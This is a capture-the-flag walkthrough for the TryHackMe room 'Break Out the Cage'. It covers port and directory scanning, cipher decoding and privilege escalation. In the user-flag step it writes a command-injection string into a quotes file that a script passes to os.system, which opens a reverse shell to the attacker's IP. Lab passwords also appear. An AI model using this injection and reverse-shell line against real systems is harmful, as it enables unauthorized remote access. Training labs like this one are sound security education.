---
title: Walkthrough - Break Out the Cage
published: true
---

Python, Steg, Rot13, Mail. Help Cage bring back his acting career and investigate the nefarious goings on of his agent!

[https://tryhackme.com/room/breakoutthecage1](https://tryhackme.com/room/breakoutthecage1)

* * *

## Notes

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             396 May 25  2020 dad_tasks
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.2.127.225
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dd:fd:88:94:f8:c8:d1:1b:51:e3:7d:f8:1d:dd:82:3e (RSA)
|   256 3e:ba:38:63:2b:8d:1c:68:13:d5:05:ba:7a:ae:d9:3b (ECDSA)
|_  256 c0:a6:a3:64:44:1e:cf:47:5f:85:f6:1f:78:4c:59:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Nicholas Cage Stories
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

In the FTP server we find ``dad_tasks`` which contains a base64 encoding. decoded it doesnt mean much to us yet, saving this here for later.

```
Qapw Eekcl - Pvr RMKP...XZW VWUR... TTI XEF... LAA ZRGQRO!!!!
Sfw. Kajnmb xsi owuowge
Faz. Tml fkfr qgseik ag oqeibx
Eljwx. Xil bqi aiklbywqe
Rsfv. Zwel vvm imel sumebt lqwdsfk
Yejr. Tqenl Vsw svnt "urqsjetpwbn einyjamu" wf.

Iz glww A ykftef.... Qjhsvbouuoexcmvwkwwatfllxughhbbcmydizwlkbsidiuscwl
```

- ``gobuster dir -u http://10.10.107.176/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 100 --no-error``

```
/images               (Status: 301) [Size: 315] [--> http://10.10.107.176/images/]
/html                 (Status: 301) [Size: 313] [--> http://10.10.107.176/html/]  
/scripts              (Status: 301) [Size: 316] [--> http://10.10.107.176/scripts/]
/contracts            (Status: 301) [Size: 318] [--> http://10.10.107.176/contracts/]
/auditions            (Status: 301) [Size: 318] [--> http://10.10.107.176/auditions/]
```

- ``wget -nd -r -l 2 -A jpg,jpeg,png,gif http://10.10.231.206/images``

Not much in all os these directories i tried stegseek on all the images but cant find a password, and still unable to crack the dad_tasts, but there is a mp3 file to look at in `/auditions/`.

![0xskar](/assets/break-out-the-cage01.png)

After messing with audacity settings it reveals a hidden message "namelesstwo". This is the key to the vigenere cipher.

```
Dads Tasks - The RAGE...THE CAGE... THE MAN... THE LEGEND!!!!
One. Revamp the website
Two. Put more quotes in script
Three. Buy bee pesticide
Four. Help him with acting lessons
Five. Teach Dad what "information security" is.

In case I forget.... Mydadisghostrideraintthatcoolnocausehesonfirejokes
```

* * * 

## What is Weston's password?

- weston:Mydadisghostrideraintthatcoolnocausehesonfirejokes

* * * 

## What's the user flag?

```
find / -type f -group 1000 2>/dev/null
/opt/.dads_scripts/spread_the_quotes.py
/opt/.dads_scripts/.files/.quotes
```

```
weston@national-treasure:/$ cat /opt/.dads_scripts/spread_the_quotes.py 
#!/usr/bin/env python

#Copyright Weston 2k20 (Dad couldnt write this with all the time in the world!)
import os
import random

lines = open("/opt/.dads_scripts/.files/.quotes").read().splitlines()
quote = random.choice(lines)
os.system("wall " + quote)
```

```
weston@national-treasure:/tmp$ sudo -l
[sudo] password for weston: 
Matching Defaults entries for weston on national-treasure:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User weston may run the following commands on national-treasure:
    (root) /usr/bin/bees
```

Not able to get much more to work here, looking at ``spread_the_quotes.py`` it is being run by cage, but we dont have permissions to write to it, however we do have permissions to write to ``/opt/.dads_scripts/.files/.quotes``

- ``echo "quote;sh -i >& /dev/tcp/10.2.127.225/6666 0>&1" > /opt/.dads_scripts/.files/.quotes``
- now that we are connected we can find the user flag in the home directory. 

* * * 

## What's the root flag?

- Looking at the backup emails there is a code "haiinspsyanileph" and a hint "face"?
- This is another Vigenere Cipher the key is face
- ``cageisnotalegend``
- we can ``su`` to root. and find the flag inside roots email backups

* * * 

